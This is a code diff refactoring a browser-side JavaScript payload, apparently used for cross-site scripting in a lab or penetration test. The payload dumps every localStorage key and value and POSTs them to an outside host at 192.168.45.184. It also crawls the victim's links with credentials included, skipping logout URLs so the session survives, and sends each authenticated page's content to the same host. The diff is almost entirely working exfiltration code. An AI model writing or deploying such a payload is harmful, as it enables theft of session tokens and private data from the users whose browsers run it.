@@ -110,7 +110,20 @@ validURL = (url) => {
     if (url.includes('logout') || url.includes('log-out') || url.includes('signout') || url.includes('sign-out')){
         return false;
     }
+    if (!(url.startsWith('https'))){
+        return false;
+    }
     return true;
+}
+
+getLocalStorage = () => {
+    Object.keys(localStorage).forEach(key => {
+        fetch("https://192.168.45.184/save_cookies", {
+            body: "name=" + encodeURIComponent(key) + "&value=" + encodeURIComponent(localStorage.getItem(key)),
+            headers: {"Content-Type": "application/x-www-form-urlencoded"},
+            method: "POST"
+        });
+    })
 }
 
 // sendCookiesXX = () => {
@@ -121,49 +134,48 @@ validURL = (url) => {
 //     });
 // };
 
-actions = () => {
-    setTimeout(() => {
-        Object.keys(localStorage).forEach(key => {
-            fetch("https://192.168.45.184/save_cookies", {
-                body: "name=" + encodeURIComponent(key) + "&value=" + encodeURIComponent(localStorage.getItem(key)),
+getPageContent = () => {
+    var allA = iframe.contentDocument.getElementsByTagName("a");
+
+    var allHrefs = [];
+    for (var i=0;i<allA.length; i++){ // Adds all links into array
+        allHrefs.push(allA[i].href);
+    }
+    var uniqueHrefs = _.unique(allHrefs);
+    var validHrefs = [];
+    for (var i=0; i<uniqueHrefs.length; i++){
+        if (validURL(uniqueHrefs[i])){
+            validHrefs.push(uniqueHrefs[i]);
+        }
+    }
+    // Run the request asynchronously to ensure it won't freez   e up user's browser
+    validHrefs.forEach(href => {
+        console.log("Attempting " + href);
+        fetch(href, {
+            "credentials": "include",
+            "method": "GET"
+        })
+        .catch(err => {
+            return err;
+        }).then((response) => {
+            return response.text();
+        }).then((text) => {
+            fetch("https://192.168.45.184/save_page", {
+                body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
                 headers: {"Content-Type": "application/x-www-form-urlencoded"},
                 method: "POST"
             });
-        })
+        });
+    });
+}
+
+actions = () => {
+    setTimeout(() => {
+        getLocalStorage();
     }, 2000); // Leave time for page to load
 
     setTimeout(() => {
-
-        var allA = iframe.contentDocument.getElementsByTagName("a");
-
-        var allHrefs = [];
-        for (var i=0;i<allA.length; i++){ // Adds all links into array
-            allHrefs.push(allA[i].href);
-        }
-        var uniqueHrefs = _.unique(allHrefs);
-        var validHrefs = [];
-        for (var i=0; i<uniqueHrefs.length; i++){
-            if (validURL(uniqueHrefs[i])){
-                validHrefs.push(uniqueHrefs[i]);
-            }
-        }
-        // Run the request asynchronously to ensure it won't freez   e up user's browser
-        validHrefs.forEach(href => {
-            console.log("Attempting " + href)
-            fetch(href, {
-                "credentials": "include",
-                "method": "GET"
-            }).then((response) => {
-                return response.text();
-            }).then((text) => {
-                return text
-                fetch("https://192.168.45.184/save_page", {
-                    body: "url=" + encodeURIComponent(href) + "&content=" + encodeURIComponent(text),
-                    headers: {"Content-Type": "application/x-www-form-urlencoded"},
-                    method: "POST"
-                });
-            });
-        });
+        getPageContent();
     }, 5000); // Leave time for page to load
 }
 
